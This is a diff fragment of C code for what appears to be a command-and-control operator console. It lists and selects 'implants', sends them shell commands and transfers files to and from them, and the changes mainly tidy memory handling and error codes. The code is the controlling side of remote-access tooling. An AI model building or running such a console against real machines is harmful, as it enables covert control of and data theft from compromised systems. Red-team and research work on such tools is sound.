@@ -38,24 +38,17 @@ extern volatile sig_atomic_t shell_flag;
 #define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
 #define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - restart shell\n5 - stop agent\n6 - go back\n"
 
-STATIC int restart_shell(int agent_fd){
-	int buffer_size;
-	const char exit_str[] = "exit";
-	char* buffer;
+static int restart_shell(int agent_fd){
+	char exit_str[] = "exit";
 
-	buffer_size = strlen(exit_str);
-	buffer = malloc(buffer_size + 1);
-	memcpy(buffer, exit_str, buffer_size);
-
-	listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, buffer_size + 1);
+	listener_prepare_message(agent_fd, TYPE_COMMAND, exit_str, strlen(exit_str) + 1);
 
 	return RET_OK;
 }
 
-STATIC int shell_console(int agent_fd){
+static int shell_console(int agent_fd){
 	int retval;
 	char command_buf[PAYLOAD_SIZE];
-	char* buffer;
     fd_set console_fds;
     struct timeval tv;
 
@@ -74,23 +67,19 @@ STATIC int shell_console(int agent_fd){
         if (retval == -1){
             printf("select error, shell_console\n");
 			all_sigint = true;
-			return RET_ERROR;
+			return RET_FATAL_ERROR;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
 			memset(command_buf, 0, PAYLOAD_SIZE);
 			if (!fgets(command_buf, PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
-				return RET_ERROR;
+				return RET_FATAL_ERROR;
 			}
 
-			buffer = malloc(PAYLOAD_SIZE);
-			memset(buffer, 0, PAYLOAD_SIZE);
-			memcpy(buffer, command_buf, PAYLOAD_SIZE);
+			debug_print("Sending console command: %s\n", command_buf);
 
-			debug_print("Sending console command: %s\n", buffer);
-
-			listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strnlen(buffer, PAYLOAD_SIZE));
+			listener_prepare_message(agent_fd, TYPE_COMMAND, command_buf, strlen(command_buf) + 1);
 			print_out("%s\n", "");
 		}
 	}
@@ -100,41 +89,35 @@ STATIC int shell_console(int agent_fd){
 	return RET_OK;
 }
 
-STATIC int get_file_command(int agent_fd){
+static int get_file_command(int agent_fd){
 	char buf[PAYLOAD_SIZE];
-	int file_name_size;
-	char* file_name_buffer;
 
 	print_out("%s", "File name");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 
 	// take newline off
 	buf[strcspn(buf, "\n")] = 0;
 
-	file_name_size = strlen(buf);
-	file_name_buffer = calloc(1, file_name_size + 1);
-	memcpy(file_name_buffer, buf, file_name_size);
+	debug_print("Get file: %s\n", buf);
 
-	debug_print("Get file: %s\n", file_name_buffer);
-
-	listener_prepare_message(agent_fd, TYPE_GET_FILE_NAME, file_name_buffer, file_name_size + 1);
+	listener_prepare_message(agent_fd, TYPE_GET_FILE_NAME, buf, strlen(buf) + 1);
 
 	return RET_OK;
 }
 
-STATIC int put_file_command(int agent_fd){
+static int put_file_command(int agent_fd){
 	char buf[PAYLOAD_SIZE];
 	FILE* file_fd;
-	int file_size, file_name_size, bytes_read;
-	char *file_buffer, *file_name_buffer;
+	int file_size, bytes_read;
+	char *file_buffer;
 
 	print_out("%s", "Source file");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 
 	// take newline off
@@ -148,16 +131,16 @@ STATIC int put_file_command(int agent_fd){
 
 	if ((file_fd = fopen(buf, "rb")) == 0){
 		printf("ERROR file open\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 
 	if (fseek(file_fd, 0L, SEEK_END) == -1){
 		printf("ERROR fseek\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 	if ((file_size = ftell(file_fd)) == -1){
 		printf("ERROR ftell\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 	rewind(file_fd);
 
@@ -166,7 +149,7 @@ STATIC int put_file_command(int agent_fd){
 	bytes_read = fread(file_buffer, 1, file_size, file_fd);
 	if (bytes_read != file_size || ferror(file_fd)){
 		printf("ERROR fread\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 	
 	fclose(file_fd);
@@ -174,25 +157,21 @@ STATIC int put_file_command(int agent_fd){
 	print_out("%s", "Destination file (default is current directory)");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("fgets error\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 
 	// take newline off
 	buf[strcspn(buf, "\n")] = 0;
 
-	file_name_size = strlen(buf);
-	file_name_buffer = calloc(1, file_name_size + 1);
-	memcpy(file_name_buffer, buf, file_name_size);
-
-	listener_prepare_message(agent_fd, TYPE_PUT_FILE_NAME, file_name_buffer, file_name_size + 1);
+	listener_prepare_message(agent_fd, TYPE_PUT_FILE_NAME, buf, strlen(buf) + 1);
 	listener_prepare_message(agent_fd, TYPE_PUT_FILE, file_buffer, file_size);
 
-	debug_print("Put file: %s, size: %d\n", file_name_buffer, file_size);
+	debug_print("Put file: %s, size: %d\n", buf, file_size);
 
 	return RET_OK;
 }
 
-STATIC int agent_console(Agent* agent, int agent_fd){
+static int agent_console(Agent* agent, int agent_fd){
 	int retval;
 	char opt_buf[PAYLOAD_SIZE];
 	long option;
@@ -211,38 +190,38 @@ STATIC int agent_console(Agent* agent, int agent_fd){
         if (retval == -1){
             printf("select error, agent_console\n");
 			all_sigint = true;
-			return RET_ERROR;
+			return RET_FATAL_ERROR;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
 			if (!fgets(opt_buf, PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
-				return RET_ERROR;
+				return RET_FATAL_ERROR;
 			}
 			option = strtol(opt_buf, NULL, 10);
 			switch(option){
 				case 1:
 					// console
 					if (shell_console(agent_fd) != RET_OK){
-						return RET_ERROR;
+						return RET_FATAL_ERROR;
 					}
 					break;
 				case 2:
 					// put file
 					if (put_file_command(agent_fd) != RET_OK){
-						return RET_ERROR;
+						return RET_FATAL_ERROR;
 					}
 					break;
 				case 3:
 					// get file
 					if (get_file_command(agent_fd) != RET_OK){
-						return RET_ERROR;
+						return RET_FATAL_ERROR;
 					}
 					break;
 				case 4:
 					// restart shell
 					if (restart_shell(agent_fd) != RET_OK){
-						return RET_ERROR;
+						return RET_FATAL_ERROR;
 					}
 					break;
 				case 5:
